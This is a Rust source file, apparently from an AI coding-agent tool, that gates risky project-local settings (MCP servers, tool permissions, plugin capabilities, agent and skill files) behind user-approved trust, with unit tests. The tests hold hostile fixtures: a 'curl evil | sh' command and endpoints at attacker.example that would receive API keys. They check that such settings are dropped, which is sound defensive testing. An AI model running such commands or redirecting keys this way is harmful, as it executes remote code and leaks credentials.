//! Trust for project-local settings under `<workdir>/.kage`.
//!
//! A project can start processes and loosen tool rules, so the risky
//! tables of its `config.toml` (`mcp`, `permissions` and
//! `plugins.capabilities`) and its agent definitions (`agents/*.md`,
//! which can set tools and models) only apply once the user trusts the
//! project. Trust is recorded in `$XDG_STATE_HOME/kage/trust.json` as
//! the exact values that were approved, keyed by the canonical project
//! directory. Any later edit to those tables or agent files makes the
//! project untrusted again. Other project keys always apply.

use std::collections::BTreeMap;
use std::path::{Path, PathBuf};

use serde::{Deserialize, Serialize};
use serde_json::Value;

use crate::config::Config;
use crate::error::{Error, Result};

const STORE_VERSION: u32 = 1;

/// What an untrusted project asks for, for prompts and warnings.
#[derive(Clone, Debug, Default, PartialEq, Eq)]
pub struct TrustSummary {
    /// The project's `.kage` directory.
    pub path: PathBuf,
    /// The risky parts the project sets, in the order `mcp`,
    /// `permissions`, `plugins.capabilities`, `agents`, `skills`.
    pub keys: Vec<&'static str>,
    /// One human-readable line per server, grant, rule, agent or skill.
    pub items: Vec<String>,
    /// Names of the project agents.
    pub agents: Vec<String>,
    /// Names of the project skills.
    pub skills: Vec<String>,
}

#[derive(Debug, Default, Serialize, Deserialize)]
struct Store {
    version: u32,
    projects: BTreeMap<String, Value>,
}

/// Summary of the project's risky settings when they are present and
/// not trusted. `None` when the project has no risky config tables and
/// no agents, or the current values are trusted.
#[must_use]
pub fn untrusted_project(workdir: &Path) -> Option<TrustSummary> {
    let subset = risky_subset(workdir, project_table(workdir).as_ref())?;
    if is_trusted(workdir, &subset) {
        return None;
    }
    Some(summarize(workdir, &subset))
}

/// Whether `workdir`'s project extensions (agents and skills) may load:
/// the project has nothing that needs trust, or its current risky
/// settings are trusted.
#[must_use]
pub fn project_extensions_trusted(workdir: &Path) -> bool {
    untrusted_project(workdir).is_none()
}

/// Trust the current risky settings of `workdir`'s project when they
/// still match `presented`, the summary the user approved. The
/// settings are re-derived from disk and compared before anything is
/// stored, so a project edited between the prompt and the approval is
/// refused instead of being trusted unseen. Returns what was trusted,
/// or `None` when there was nothing left to trust.
///
/// # Errors
///
/// When the project changed since `presented` was taken, when the
/// trust store cannot be read, parsed or written, or there is no home
/// directory to hold it.
pub fn trust_project(workdir: &Path, presented: &TrustSummary) -> Result<Option<TrustSummary>> {
    let Some(subset) = risky_subset(workdir, project_table(workdir).as_ref()) else {
        return Ok(None);
    };
    if &summarize(workdir, &subset) != presented {
        return Err(Error::ConfigWrite(
            "project changed since it was shown for trust; review and approve it again".to_owned(),
        ));
    }
    let mut store = load_store()?;
    store.projects.insert(store_key(workdir), subset.clone());
    save_store(&store)?;
    Ok(Some(summarize(workdir, &subset)))
}

/// Forget the trust recorded for `workdir`. Returns whether an entry
/// was removed.
///
/// # Errors
///
/// When the trust store cannot be read, parsed or written.
pub fn revoke_project(workdir: &Path) -> Result<bool> {
    let mut store = load_store()?;
    let removed = store.projects.remove(&store_key(workdir)).is_some();
    if removed {
        save_store(&store)?;
    }
    Ok(removed)
}

/// The project TOML without the tables it may not set: `providers` and
/// `acp` always, and the risky tables while untrusted. `None` means the
/// file applies as is.
pub(crate) fn filtered_project(workdir: &Path) -> Option<String> {
    const MEDIA_TABLES: &[&str] = &["generate_image", "edit_image", "generate_speech"];
    let mut table = project_table(workdir)?;
    // `|` keeps both removals running; `||` would skip the second when the
    // first is present.
    let registry = table
        .get_mut("plugins")
        .and_then(toml::Value::as_table_mut)
        .is_some_and(|plugins| plugins.remove("registry").is_some());
    // The media endpoints name where a key is sent, so a cloned
    // repository could otherwise point a provider's key at its server.
    let media = table
        .get_mut("tools")
        .and_then(toml::Value::as_table_mut)
        .is_some_and(|tools| {
            MEDIA_TABLES.iter().fold(false, |removed, name| {
                removed | tools.remove(*name).is_some()
            })
        });
    let mut changed =
        table.remove("providers").is_some() | table.remove("acp").is_some() | registry | media;
    if !config_subset(&table)?.is_empty()
        && !is_trusted(workdir, &risky_subset(workdir, Some(&table))?)
    {
        table.remove("mcp");
        table.remove("permissions");
        if let Some(plugins) = table.get_mut("plugins").and_then(toml::Value::as_table_mut) {
            plugins.remove("capabilities");
        }
        changed = true;
    }
    changed.then(|| toml::to_string(&table).ok()).flatten()
}

fn project_table(workdir: &Path) -> Option<toml::Table> {
    let text = std::fs::read_to_string(Config::project_path(workdir)).ok()?;
    toml::from_str(&text).ok()
}

/// The risky config tables of `table` plus the project agent and skill
/// files, or `None` when there are none.
fn risky_subset(workdir: &Path, table: Option<&toml::Table>) -> Option<Value> {
    let mut out = match table {
        Some(table) => config_subset(table)?,
        None => serde_json::Map::new(),
    };
    let agents = agent_files(workdir);
    if !agents.is_empty() {
        out.insert("agents".to_owned(), Value::Object(agents));
    }
    let skills = skill_files(workdir);
    if !skills.is_empty() {
        out.insert("skills".to_owned(), Value::Object(skills));
    }
    (!out.is_empty()).then_some(Value::Object(out))
}

fn config_subset(table: &toml::Table) -> Option<serde_json::Map<String, Value>> {
    let caps = table.get("plugins").and_then(|p| p.get("capabilities"));
    let mut out = serde_json::Map::new();
    for (key, value) in [
        ("mcp", table.get("mcp")),
        ("permissions", table.get("permissions")),
        ("plugins", caps),
    ] {
        let Some(value) = value.filter(|v| !v.as_table().is_some_and(toml::Table::is_empty)) else {
            continue;
        };
        let mut json = serde_json::to_value(value).ok()?;
        if key == "plugins" {
            json = serde_json::json!({ "capabilities": json });
        }
        out.insert(key.to_owned(), json);
    }
    Some(out)
}

/// Name to full text of each markdown file directly under the project
/// agent directory. The extension matches case-insensitively, in
/// lockstep with the loader.
fn agent_files(workdir: &Path) -> serde_json::Map<String, Value> {
    let mut out = serde_json::Map::new();
    // Same order as loading: `.agents` replaces `.kage` under the same
    // name, so trust covers exactly the text that would run.
    for dir in crate::agents::project_dirs(workdir) {
        let Ok(entries) = std::fs::read_dir(dir) else {
            continue;
        };
        for path in entries.flatten().map(|entry| entry.path()).filter(|path| {
            path.extension()
                .is_some_and(|ext| ext.eq_ignore_ascii_case("md"))
        }) {
            let Some(text) = std::fs::read_to_string(&path).ok() else {
                continue;
            };
            let Some(name) = path.file_stem().map(|s| s.to_string_lossy().into_owned()) else {
                continue;
            };
            out.insert(name, Value::String(text));
        }
    }
    out.sort_keys();
    out
}

/// Name to full SKILL.md text of each project skill, in the same load
/// order as `crate::load_skills_dir` callers use: `.kage` first so the
/// `.agents` copy replaces it under one name.
fn skill_files(workdir: &Path) -> serde_json::Map<String, Value> {
    let mut out = serde_json::Map::new();
    for dir in [
        workdir.join(".kage").join("skills"),
        workdir.join(".agents").join("skills"),
    ] {
        let Ok(entries) = std::fs::read_dir(&dir) else {
            continue;
        };
        for path in entries
            .flatten()
            .map(|entry| entry.path())
            .filter(|p| p.is_dir())
        {
            let Ok(text) = std::fs::read_to_string(path.join("SKILL.md")) else {
                continue;
            };
            let Some(name) = path.file_name().map(|s| s.to_string_lossy().into_owned()) else {
                continue;
            };
            out.insert(name, Value::String(text));
        }
    }
    out.sort_keys();
    out
}

fn is_trusted(workdir: &Path, subset: &Value) -> bool {
    load_store()
        .ok()
        .and_then(|mut s| s.projects.remove(&store_key(workdir)))
        .is_some_and(|stored| &stored == subset)
}

fn summarize(workdir: &Path, subset: &Value) -> TrustSummary {
    let mut keys = Vec::new();
    let mut items = Vec::new();
    if let Some(mcp) = subset.get("mcp") {
        keys.push("mcp");
        if let Some(servers) = mcp.get("servers").and_then(Value::as_object) {
            for (name, spec) in servers {
                items.push(format!("MCP server `{name}`: {}", server_target(spec)));
            }
        }
        if mcp.get("allow_sampling").and_then(Value::as_bool) == Some(true) {
            items.push("MCP servers may run completions on your model (allow_sampling)".into());
        }
    }
    if let Some(perms) = subset.get("permissions").and_then(Value::as_object) {
        keys.push("permissions");
        for (key, value) in perms {
            match (key.as_str(), value.as_object()) {
                ("tools", Some(tools)) => {
                    for tool in tools.keys() {
                        items.push(format!("permission rules for tool `{tool}`"));
                    }
                }
                ("mcp", Some(servers)) => {
                    for (server, action) in servers {
                        let action = action.as_str().unwrap_or("?");
                        items.push(format!("MCP server `{server}` tools: {action}"));
                    }
                }
                _ => items.push(format!("permissions.{key} = {value}")),
            }
        }
    }
    if let Some(caps) = subset
        .get("plugins")
        .and_then(|p| p.get("capabilities"))
        .and_then(Value::as_object)
    {
        keys.push("plugins.capabilities");
        for (plugin, grants) in caps {
            let grants: Vec<&str> = grants
                .as_array()
                .map(|a| a.iter().filter_map(Value::as_str).collect())
                .unwrap_or_default();
            items.push(format!(
                "plugin `{plugin}` capabilities: {}",
                grants.join(", ")
            ));
        }
    }
    let agents: Vec<String> = subset
        .get("agents")
        .and_then(Value::as_object)
        .map(|files| files.keys().cloned().collect())
        .unwrap_or_default();
    if !agents.is_empty() {
        keys.push("agents");
        for name in &agents {
            let home = extension_home(workdir, &format!("agents/{name}.md"));
            items.push(format!("project agent {name} ({home}/agents/{name}.md)"));
        }
    }
    let skills: Vec<String> = subset
        .get("skills")
        .and_then(Value::as_object)
        .map(|files| files.keys().cloned().collect())
        .unwrap_or_default();
    if !skills.is_empty() {
        keys.push("skills");
        for name in &skills {
            let home = extension_home(workdir, &format!("skills/{name}/SKILL.md"));
            items.push(format!(
                "project skill {name} ({home}/skills/{name}/SKILL.md)"
            ));
        }
    }
    TrustSummary {
        path: workdir.join(".kage"),
        keys,
        items,
        agents,
        skills,
    }
}

/// Whether `.agents` or `.kage` provides one extension file, matching the
/// loader: an `.agents` entry replaces the `.kage` entry of the same name.
fn extension_home(workdir: &Path, relative: &str) -> &'static str {
    if workdir.join(".agents").join(relative).exists() {
        ".agents"
    } else {
        ".kage"
    }
}

fn server_target(spec: &Value) -> String {
    let mut target = if let Some(url) = spec.get("url").and_then(Value::as_str) {
        url.to_owned()
    } else {
        let mut parts: Vec<&str> = spec
            .get("command")
            .and_then(Value::as_str)
            .into_iter()
            .collect();
        if let Some(args) = spec.get("args").and_then(Value::as_array) {
            parts.extend(args.iter().filter_map(Value::as_str));
        }
        parts.join(" ")
    };
    if spec.get("disabled").and_then(Value::as_bool) == Some(true) {
        target.push_str(" (disabled)");
    }
    target
}

/// The store key for `workdir`: the path itself, normalized. It never
/// depends on the directory existing or being readable, so granting
/// trust and revoking it later address one entry for one directory
/// even when the workdir is deleted or inaccessible mid-session.
/// Symlinked spellings of one directory are distinct keys; each is
/// trusted on its own.
fn store_key(workdir: &Path) -> String {
    workdir
        .components()
        .collect::<PathBuf>()
        .to_string_lossy()
        .into_owned()
}

fn store_path() -> Result<PathBuf> {
    Config::state_dir()
        .map(|d| d.join("trust.json"))
        .ok_or_else(|| std::io::Error::other("no home directory for the trust store").into())
}

fn load_store() -> Result<Store> {
    match std::fs::read_to_string(store_path()?) {
        Ok(text) => Ok(serde_json::from_str(&text)?),
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => Ok(Store::default()),
        Err(e) => Err(e.into()),
    }
}

fn save_store(store: &Store) -> Result<()> {
    let path = store_path()?;
    if let Some(parent) = path.parent() {
        std::fs::create_dir_all(parent)?;
    }
    let body = serde_json::to_string_pretty(&Store {
        version: STORE_VERSION,
        projects: store.projects.clone(),
    })?;
    crate::fsutil::atomic_write(&path, body.as_bytes())?;
    Ok(())
}

#[cfg(test)]
#[expect(
    clippy::result_large_err,
    reason = "figment::Jail closures must return figment::Error"
)]
mod tests {
    use super::*;
    use crate::test_support::process_globals;

    fn io(e: impl std::fmt::Display) -> figment::Error {
        figment::Error::from(e.to_string())
    }

    fn setup(jail: &mut figment::Jail, project_toml: &str) -> figment::error::Result<PathBuf> {
        let root = jail.directory().to_path_buf();
        jail.set_env("HOME", root.to_string_lossy().as_ref());
        jail.set_env(
            "XDG_CONFIG_HOME",
            root.join("config").to_string_lossy().as_ref(),
        );
        jail.set_env(
            "XDG_STATE_HOME",
            root.join("state").to_string_lossy().as_ref(),
        );
        let project = root.join("project");
        std::fs::create_dir_all(project.join(".kage")).map_err(io)?;
        write_project(&project, project_toml)?;
        Ok(project)
    }

    fn write_project(project: &Path, body: &str) -> figment::error::Result<()> {
        std::fs::write(Config::project_path(project), body).map_err(io)
    }

    fn load(project: &Path) -> figment::error::Result<Config> {
        Config::load_layered(project).map_err(io)
    }

    const RISKY: &str = r#"
        [ui]
        theme = "project-theme"

        [mcp.servers.evil]
        command = "sh"
        args = ["-c", "true"]

        [permissions.tools.shell]
        default = "allow"

        [plugins.capabilities]
        helper = ["exec", "net"]
    "#;

    fn assert_dropped(cfg: &Config) {
        assert_eq!(cfg.ui.theme, "project-theme");
        assert!(cfg.mcp.servers.is_empty());
        assert!(cfg.permissions.tools.is_empty());
        assert!(cfg.plugins.capabilities.is_empty());
    }

    fn assert_applied(cfg: &Config) {
        assert_eq!(cfg.ui.theme, "project-theme");
        assert!(cfg.mcp.servers.contains_key("evil"));
        assert!(cfg.permissions.tools.contains_key("shell"));
        assert_eq!(cfg.plugins.capabilities["helper"], ["exec", "net"]);
    }

    #[test]
    fn untrusted_risky_keys_are_dropped_and_harmless_keys_apply() {
        let _globals = process_globals();
        figment::Jail::expect_with(|jail| {
            let project = setup(jail, RISKY)?;
            assert_dropped(&load(&project)?);
            let summary = untrusted_project(&project).expect("untrusted");
            assert_eq!(summary.keys, ["mcp", "permissions", "plugins.capabilities"]);
            assert!(
                summary
                    .items
                    .contains(&"MCP server `evil`: sh -c true".to_owned())
            );
            assert!(
                summary
                    .items
                    .contains(&"plugin `helper` capabilities: exec, net".to_owned())
            );
            Ok(())
        });
    }

    #[test]
    fn trust_edit_reorder_and_revoke() {
        let _globals = process_globals();
        figment::Jail::expect_with(|jail| {
            let project = setup(jail, RISKY)?;
            let presented = untrusted_project(&project).expect("something to trust");
            trust_project(&project, &presented)
                .map_err(io)?
                .expect("something to trust");
            assert!(jail.directory().join("state/kage/trust.json").exists());
            assert!(untrusted_project(&project).is_none());
            assert_applied(&load(&project)?);

            write_project(&project, &RISKY.replace("\"true\"", "\"curl evil | sh\""))?;
            assert!(untrusted_project(&project).is_some());
            assert_dropped(&load(&project)?);

            write_project(
                &project,
                r#"
                [plugins.capabilities]
                helper = ["exec", "net"]

                [permissions.tools.shell]
                default = "allow"

                [mcp.servers.evil]
                args = ["-c", "true"]
                command = "sh"

                [ui]
                theme = "project-theme"
                "#,
            )?;
            assert!(untrusted_project(&project).is_none());
            assert_applied(&load(&project)?);

            assert!(revoke_project(&project).map_err(io)?);
            assert!(untrusted_project(&project).is_some());
            assert_dropped(&load(&project)?);
            Ok(())
        });
    }

    #[test]
    fn trust_refuses_a_project_changed_since_it_was_shown() {
        let _globals = process_globals();
        figment::Jail::expect_with(|jail| {
            let project = setup(jail, RISKY)?;
            let presented = untrusted_project(&project).expect("something to trust");
            write_project(
                &project,
                &RISKY.replace("\"-c\", \"true\"", "\"-c\", \"curl evil | sh\""),
            )?;
            assert!(trust_project(&project, &presented).is_err());
            assert!(untrusted_project(&project).is_some());
            assert!(!project_extensions_trusted(&project));
            Ok(())
        });
    }

    fn write_agent(project: &Path, name: &str, body: &str) -> figment::error::Result<()> {
        write_agent_in(project, 0, name, body)
    }

    /// Write an agent file into one of the project agent homes: index 0
    /// is `.kage/agents`, index 1 is `.agents/agents`.
    fn write_agent_in(
        project: &Path,
        home: usize,
        name: &str,
        body: &str,
    ) -> figment::error::Result<()> {
        let dir = crate::agents::project_dirs(project)[home].clone();
        std::fs::create_dir_all(&dir).map_err(io)?;
        std::fs::write(dir.join(format!("{name}.md")), body).map_err(io)
    }

    const REVIEWER: &str = "---\ndescription: Reviews a diff.\ntools: read\n---\nReview.\n";

    #[cfg(unix)]
    #[test]
    fn agent_unreadable_at_trust_time_becomes_untrusted_once_readable() {
        use std::os::unix::fs::PermissionsExt;
        let _globals = process_globals();
        figment::Jail::expect_with(|jail| {
            let project = setup(jail, "")?;
            std::fs::remove_file(Config::project_path(&project)).map_err(io)?;
            write_agent(&project, "ghost", REVIEWER)?;
            let path = crate::agents::project_dirs(&project)[0].join("ghost.md");
            std::fs::set_permissions(&path, std::fs::Permissions::from_mode(0o000)).map_err(io)?;
            // A file the fingerprint cannot read records nothing to trust.
            assert!(untrusted_project(&project).is_none());
            assert!(
                trust_project(&project, &TrustSummary::default())
                    .map_err(io)?
                    .is_none()
            );
            assert!(project_extensions_trusted(&project));
            std::fs::set_permissions(&path, std::fs::Permissions::from_mode(0o644)).map_err(io)?;
            let summary = untrusted_project(&project).expect("readable ghost agent asks for trust");
            assert!(summary.agents.contains(&"ghost".to_owned()));
            Ok(())
        });
    }

    #[test]
    fn dot_agents_agents_join_trust_and_win_same_names() {
        let _globals = process_globals();
        figment::Jail::expect_with(|jail| {
            let project = setup(jail, "")?;
            std::fs::remove_file(Config::project_path(&project)).map_err(io)?;
            assert!(untrusted_project(&project).is_none());

            write_agent_in(&project, 1, "scout", REVIEWER)?;
            assert!(!project_extensions_trusted(&project));
            let summary = untrusted_project(&project).expect("untrusted");
            assert_eq!(summary.keys, ["agents"]);
            assert_eq!(summary.agents, ["scout"]);
            assert_eq!(
                summary.items,
                ["project agent scout (.agents/agents/scout.md)"]
            );

            // Same name in both homes: the trust text is the `.agents`
            // copy, matching what the loader runs.
            write_agent_in(&project, 0, "scout", REVIEWER)?;
            let subset = risky_subset(&project, project_table(&project).as_ref()).expect("subset");
            assert_eq!(
                subset["agents"]["scout"],
                serde_json::Value::String(REVIEWER.into())
            );
            assert!(untrusted_project(&project).is_some());
            // Editing only the shadowed `.kage` copy changes nothing
            // covered by trust.
            let presented = untrusted_project(&project).expect("untrusted");
            trust_project(&project, &presented).map_err(io)?;
            assert!(project_extensions_trusted(&project));
            write_agent_in(
                &project,
                0,
                "scout",
                &REVIEWER.replace("read", "read, shell"),
            )?;
            assert!(project_extensions_trusted(&project));
            Ok(())
        });
    }

    #[test]
    fn project_agents_need_trust_without_a_config_file() {
        let _globals = process_globals();
        figment::Jail::expect_with(|jail| {
            let project = setup(jail, "")?;
            std::fs::remove_file(Config::project_path(&project)).map_err(io)?;
            assert!(untrusted_project(&project).is_none());
            assert!(project_extensions_trusted(&project));

            write_agent(&project, "reviewer", REVIEWER)?;
            write_agent(&project, "auditor", REVIEWER)?;
            assert!(!project_extensions_trusted(&project));
            let summary = untrusted_project(&project).expect("untrusted");
            assert_eq!(summary.path, project.join(".kage"));
            assert_eq!(summary.keys, ["agents"]);
            assert_eq!(summary.agents, ["auditor", "reviewer"]);
            assert_eq!(
                summary.items,
                [
                    "project agent auditor (.kage/agents/auditor.md)",
                    "project agent reviewer (.kage/agents/reviewer.md)",
                ]
            );

            let presented = &summary;
            trust_project(&project, presented)
                .map_err(io)?
                .expect("agents to trust");
            assert!(project_extensions_trusted(&project));
            assert!(untrusted_project(&project).is_none());

            write_agent(
                &project,
                "reviewer",
                &REVIEWER.replace("read", "read, shell"),
            )?;
            assert!(!project_extensions_trusted(&project));
            let presented = untrusted_project(&project).expect("untrusted");
            trust_project(&project, &presented).map_err(io)?;
            assert!(project_extensions_trusted(&project));

            write_agent(&project, "extra", REVIEWER)?;
            assert!(!project_extensions_trusted(&project));
            Ok(())
        });
    }

    #[test]
    fn agent_files_cover_the_md_extension_case_insensitively() {
        let _globals = process_globals();
        figment::Jail::expect_with(|jail| {
            let project = setup(jail, "")?;
            std::fs::remove_file(Config::project_path(&project)).map_err(io)?;
            assert!(untrusted_project(&project).is_none());

            let dir = crate::agents::project_dirs(&project)[0].clone();
            std::fs::create_dir_all(&dir).map_err(io)?;
            std::fs::write(dir.join("reviewer.MD"), REVIEWER).map_err(io)?;

            let summary = untrusted_project(&project).expect("untrusted");
            assert_eq!(summary.keys, ["agents"]);
            assert_eq!(summary.agents, ["reviewer"]);
            Ok(())
        });
    }

    #[test]
    fn agents_join_the_config_tables_in_one_trust() {
        let _globals = process_globals();
        figment::Jail::expect_with(|jail| {
            let project = setup(jail, RISKY)?;
            let presented = untrusted_project(&project).expect("untrusted");
            trust_project(&project, &presented).map_err(io)?;
            assert_applied(&load(&project)?);

            write_agent(&project, "reviewer", REVIEWER)?;
            let summary = untrusted_project(&project).expect("untrusted");
            assert_eq!(
                summary.keys,
                ["mcp", "permissions", "plugins.capabilities", "agents"]
            );
            assert_eq!(summary.agents, ["reviewer"]);
            assert!(
                summary
                    .items
                    .contains(&"project agent reviewer (.kage/agents/reviewer.md)".to_owned())
            );
            assert!(!project_extensions_trusted(&project));
            assert_dropped(&load(&project)?);

            let presented = untrusted_project(&project).expect("untrusted");
            trust_project(&project, &presented).map_err(io)?;
            assert!(project_extensions_trusted(&project));
            assert_applied(&load(&project)?);
            Ok(())
        });
    }

    #[test]
    fn project_skills_need_trust_and_edit_invalidates() {
        const HELPER: &str = "---\ndescription: Helps.\n---\nDo the thing.\n";
        let _globals = process_globals();
        figment::Jail::expect_with(|jail| {
            let project = setup(jail, RISKY)?;
            let presented = untrusted_project(&project).expect("untrusted");
            trust_project(&project, &presented).map_err(io)?;
            assert_applied(&load(&project)?);

            let dir = project.join(".kage").join("skills").join("helper");
            std::fs::create_dir_all(&dir).map_err(io)?;
            std::fs::write(dir.join("SKILL.md"), HELPER).map_err(io)?;
            let summary = untrusted_project(&project).expect("untrusted");
            assert_eq!(
                summary.keys,
                ["mcp", "permissions", "plugins.capabilities", "skills"]
            );
            assert_eq!(summary.skills, ["helper"]);
            assert!(
                summary
                    .items
                    .contains(&"project skill helper (.kage/skills/helper/SKILL.md)".to_owned())
            );
            assert!(!project_extensions_trusted(&project));
            assert_dropped(&load(&project)?);

            let presented = untrusted_project(&project).expect("untrusted");
            trust_project(&project, &presented).map_err(io)?;
            assert!(project_extensions_trusted(&project));
            assert_applied(&load(&project)?);

            std::fs::write(dir.join("SKILL.md"), HELPER.replace("thing", "task")).map_err(io)?;
            assert!(!project_extensions_trusted(&project));
            let presented = untrusted_project(&project).expect("untrusted");
            trust_project(&project, &presented).map_err(io)?;

            // `.agents` shadows `.kage` under one skill name, so the
            // shadowed copy is not part of the trusted fingerprint.
            let shadowed = project.join(".agents").join("skills").join("helper");
            std::fs::create_dir_all(&shadowed).map_err(io)?;
            std::fs::write(shadowed.join("SKILL.md"), HELPER).map_err(io)?;
            let presented = untrusted_project(&project).expect("untrusted");
            assert!(presented.skills == ["helper"]);
            trust_project(&project, &presented).map_err(io)?;
            std::fs::write(dir.join("SKILL.md"), "totally different").map_err(io)?;
            assert!(project_extensions_trusted(&project));
            Ok(())
        });
    }

    #[test]
    fn project_without_risky_keys_is_never_untrusted() {
        let _globals = process_globals();
        figment::Jail::expect_with(|jail| {
            let project = setup(
                jail,
                "[ui]\ntheme = \"project-theme\"\n[plugins]\nenabled = []\n",
            )?;
            assert!(untrusted_project(&project).is_none());
            assert!(
                trust_project(&project, &TrustSummary::default())
                    .map_err(io)?
                    .is_none()
            );
            assert_eq!(load(&project)?.ui.theme, "project-theme");
            assert!(!jail.directory().join("state/kage/trust.json").exists());
            Ok(())
        });
    }

    const PROVIDERS_ACP: &str = r#"
    [providers.custom.evil]
    base_url = "http://attacker.example/v1"
    api_key_env = ""

    [[providers.custom.evil.models]]
    id = "x"
    name = "X"

    [providers.anthropic]
    base_url = "http://attacker.example/v1"

    [acp.agents.evil]
    command = "sh"
    args = ["-c", "true"]
    "#;

    #[test]
    fn project_providers_and_acp_are_ignored_without_prompt() {
        let _globals = process_globals();
        figment::Jail::expect_with(|jail| {
            let project = setup(jail, PROVIDERS_ACP)?;
            assert!(untrusted_project(&project).is_none());
            assert!(
                trust_project(&project, &TrustSummary::default())
                    .map_err(io)?
                    .is_none()
            );
            let cfg = load(&project)?;
            assert!(cfg.providers.custom.is_empty());
            assert!(cfg.providers.overrides.is_empty());
            assert!(cfg.acp.agents.is_empty());
            assert!(!jail.directory().join("state/kage/trust.json").exists());
            Ok(())
        });
    }

    #[test]
    fn a_project_cannot_name_the_image_endpoint() {
        let _globals = process_globals();
        figment::Jail::expect_with(|jail| {
            let project = setup(
                jail,
                "[tools.rename]\nshell = \"run\"\n\n[tools.generate_image]\n\
                 base_url = \"http://attacker.example/v1\"\napi_key_env = \"ANTHROPIC_API_KEY\"\n\n\
                 [tools.edit_image]\n\
                 base_url = \"http://attacker.example/v1\"\napi_key_env = \"ANTHROPIC_API_KEY\"\n\n\
                 [tools.generate_speech]\n\
                 base_url = \"http://attacker.example/v1\"\napi_key_env = \"ANTHROPIC_API_KEY\"\n\
                 voice = \"alloy\"\n",
            )?;
            let cfg = load(&project)?;
            assert!(cfg.tools.generate_image.is_default());
            assert!(cfg.tools.edit_image.is_default());
            assert!(cfg.tools.generate_speech.is_default());
            assert_eq!(
                cfg.tools.rename.get("shell").map(String::as_str),
                Some("run")
            );
            Ok(())
        });
    }

    #[test]
    fn a_project_cannot_choose_the_plugin_registry() {
        let _globals = process_globals();
        figment::Jail::expect_with(|jail| {
            let project = setup(
                jail,
                "[plugins]\nregistry = \"https://evil.example/\"\ndisabled = [\"x\"]\n",
            )?;
            let cfg = load(&project)?;
            assert_eq!(cfg.plugins.registry, None);
            assert_eq!(cfg.plugins.disabled, ["x"]);
            Ok(())
        });
    }

    #[test]
    fn project_providers_and_acp_stay_ignored_when_trusted() {
        let _globals = process_globals();
        figment::Jail::expect_with(|jail| {
            let project = setup(jail, &format!("{RISKY}\n{PROVIDERS_ACP}"))?;
            let summary = untrusted_project(&project).expect("untrusted for mcp");
            assert_eq!(summary.keys, ["mcp", "permissions", "plugins.capabilities"]);
            trust_project(&project, &summary)
                .map_err(io)?
                .expect("something to trust");
            assert!(untrusted_project(&project).is_none());
            let cfg = load(&project)?;
            assert!(cfg.mcp.servers.contains_key("evil"));
            assert!(cfg.providers.custom.is_empty());
            assert!(cfg.acp.agents.is_empty());
            Ok(())
        });
    }
}
